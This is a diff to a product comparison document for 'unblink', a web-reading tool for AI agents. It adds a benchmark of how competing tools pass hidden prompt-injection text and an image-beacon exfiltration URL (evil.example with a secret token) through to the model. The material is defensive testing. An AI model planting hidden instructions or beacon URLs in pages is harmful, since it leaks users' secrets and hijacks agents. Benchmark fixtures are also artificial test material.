@@ -39,7 +39,7 @@ explicit about both directions.
 | Install footprint | One static binary (linux/darwin/windows), nothing else; ~36 MB, ~26 MB idle RSS ([measured](#measured-footprint)) | Node + full browser install | Node + Chromium (npm or Docker) | ~147 MB of binaries; [measured](#measured-footprint): 8 MB idle RSS, 2 ms cold start — leaner than its own claims | ~138 MB single binary; [measured](#measured-footprint): 15 MB idle RSS, 5 ms cold start; no native Windows, glibc-only Linux |
 | Token efficiency | Core design: token-budgeted, cursor-paginated Markdown; cheap `browse`/`find` orientation. [Measured](#token-cost-per-page): reads a nav-heavy portal for ~1% of a snapshot's tokens | Verbose — [measured](#token-cost-per-page): ×88 unblink's read on a nav-heavy portal; no orientation surface | Core design: orientation 23–178× smaller than a11y-tree dumps. [Measured](#token-cost-per-page): orientation 1.3–2× unblink's `browse`; *reading* costs snapshot-scale | Not a design concern — [measured](#token-cost-per-page): its snapshot truncates at ~4 KB and never reaches the article on a nav-heavy page | Not a design concern, though its `markdown` tool is genuinely dense — [measured](#token-cost-per-page): cheapest column on small clean pages, ×68 unblink on a nav-heavy portal (no reduction, budget, or orientation) |
 | Sessions | Cookies + history + persistent live JS runtime per session | Real browser profile, tabs, storage | Persistent Chromium session, stable hashed element IDs, structural diffs | Fast-boot ephemeral sessions | CDP sessions |
-| Agent-safety defaults | SSRF dial guard + untrusted-content fence + origin-scoped credentials, all on by default | — | Chromium sandbox on by default | Stealth / anti-fingerprinting, tracker blocking (a different goal) | robots.txt respect, proxy support |
+| Agent-safety defaults | SSRF dial guard + untrusted-content fence + origin-scoped credentials, all on by default; [measured](#content-boundary-what-reaches-the-model): only tool that fences content as untrusted and defangs image-beacon exfiltration to inert text | — | Chromium sandbox on by default | Stealth / anti-fingerprinting, tracker blocking (secures the browser, not the content boundary; [measured](#content-boundary-what-reaches-the-model): no untrusted-content fence) | robots.txt respect, proxy support ([measured](#content-boundary-what-reaches-the-model): leaks all hidden text + a live image-beacon, no fence) |
 | License | MIT | Apache-2.0 | MIT | Apache-2.0 | AGPL-3.0 |
 | Maturity (07/2026) | v0.17.1 | Mature incumbent (in GitHub Copilot's coding agent) | v0.6.3 (npm) | v0.1.9 | Beta |
 
@@ -121,8 +121,11 @@ hard-truncates at ~4 KB with no continuation mechanism, so on a nav-heavy
 portal the article never makes it into the output at all, and on a long read
 the one-shot buys only the first half of the text; the whole document takes
 `browser_markdown` with an explicit size cap. There is no orientation
-surface. Very early (v0.1.9) — our React and Vue fixtures rendered, the Lit
-one came back empty ([render speed](#render-speed)).
+surface, and no content-boundary hardening — [measured](#content-boundary-what-reaches-the-model),
+it passes all three hidden-instruction blocks straight to the model, emits a
+live image-beacon URL through its `browser_markdown` read, and returns the raw
+byte stream on a PDF. Very early (v0.1.9) — our React and Vue fixtures
+rendered, the Lit one came back empty ([render speed](#render-speed)).
 
 ### Lightpanda
 
@@ -147,9 +150,11 @@ the JS web is a moving target, much like unblink's flat-DOM model but without
 the static-reduction fallback unblink leans on when JS isn't needed. And its
 `markdown` is *rendering*, not reduction: no article extraction, token
 budget, pagination, or orientation surface, so a nav-heavy portal costs ×68
-unblink's read ([token cost](#token-cost-per-page)). Platform constraints
-(no native Windows, glibc-only Linux) and AGPL-3.0 licensing may matter for
-embedding.
+unblink's read ([token cost](#token-cost-per-page)), and — like Obscura — no
+content-boundary hardening ([measured](#content-boundary-what-reaches-the-model):
+all hidden text and a live image-beacon pass through, and PDFs come back
+empty). Platform constraints (no native Windows, glibc-only Linux) and
+AGPL-3.0 licensing may matter for embedding.
 
 ## How unblink differs
 
@@ -367,6 +372,65 @@ their columns describe today's builds, not their trajectories. The numbers
 are machine-specific and reflect these fixtures, not the whole web. They are
 the floor of what a real browser costs, not a claim that unblink *replaces*
 one — see [Which tool when](#which-tool-when).
+
+### Content boundary (what reaches the model)
+
+Footprint and tokens are cost metrics; this one is a *safety* metric. Every
+other tool secures the *browser* (sandbox, stealth, tracker blocking); unblink
+also hardens the boundary between untrusted web content and the model. To make
+that concrete rather than asserted, `make crossbench ARGS="-safety"` drives each
+tool's `read-article` against a fixture page that carries three
+hidden-instruction blocks — a `display:none` div, an `aria-hidden` span, and
+an off-screen (`left:-9999px`) div, each with a distinct marker — plus an image
+whose URL smuggles a secret:
+`<img src="https://evil.example/beacon.png?leak=SECRET-TOKEN-42">`. That image
+is a real zero-click exfiltration channel: a client that auto-renders a
+Markdown `![](url)` fetches the URL, and the secret leaves with the request.
+Reading that page (and a one-page PDF) through each tool's read surface:
+
+| Behavior | unblink | Playwright MCP | Charlotte | Obscura | Lightpanda |
+|---|---|---|---|---|---|
+| Hidden-instruction blocks leaked (of 3) | 1 | 2 | 1 | 3 | 3 |
+| Image-beacon exfiltration URL | **defanged**¹ | dropped | dropped | dropped² | live `![](url)` |
+| Output fenced as untrusted | **yes** | no | no | no | no |
+| One-page PDF | **clean text** | other³ | other³ | raw `%PDF` bytes² | empty |
+
+¹ unblink alone rewrites the image to inert text `[image: … — url]`: the URL
+stays *visible* as data (auditable) but a client won't auto-fetch it. The
+others that show "dropped" simply omit the image from their structured/plain
+read; Lightpanda's Markdown emits it live.
+² measured on Obscura's plain-text snapshot; its `browser_markdown` (the
+token-dense read it recommends) instead emits the beacon **live** and dumps the
+raw PDF bytes.
+³ navigating a browser tool to a PDF yields neither extracted text nor raw
+bytes — a viewer/download shell the model can't read as content.
+
+Two properties are unique to unblink and clean. **It is the only tool that
+fences its output** as untrusted data — an `[UNTRUSTED WEB CONTENT …]` wrapper
+with a random marker, so injected imperatives read as data, not instructions,
+*regardless of what slipped past extraction*. And **it is the only tool that
+turns the PDF into readable text** (the others render what a browser renders;
+unblink fetches and parses, so PDFs, feeds, and images go through the same
+`read`).
+
+The **hidden-text** picture is more of a spectrum than a win: the raw DOM dumps
+(Obscura, Lightpanda) leak all three blocks, the structured surfaces (unblink's
+reduction, Playwright's a11y tree, Charlotte's decomposition) each incidentally
+drop one or two, and none is airtight — unblink itself leaks the off-screen
+block through its *default article* read (though `display:none` and
+`aria-hidden` are always stripped, and `mode:"full"` strips all three; the
+harness exists to catch exactly this, and article-mode off-screen stripping is
+worth tightening). What makes unblink's posture different isn't a perfect
+filter — it's that the fence backstops whatever leaks, and the beacon is defanged
+rather than dropped or fired.
+
+This is the crux of the differentiation. Obscura and Lightpanda are lean
+real-browser *automation* engines — richer interaction surfaces than unblink
+(multi-tab, storage-state replay, stealth, CSS-schema extraction) and real V8.
+They compete with Playwright MCP, a lighter CDP drop-in. unblink competes on
+the content boundary itself: reduce the page to meaning, treat what crosses into
+the model as untrusted, and cover the non-HTML web — the things a faithful DOM,
+by construction, does not do.
 
 ## Sources
 
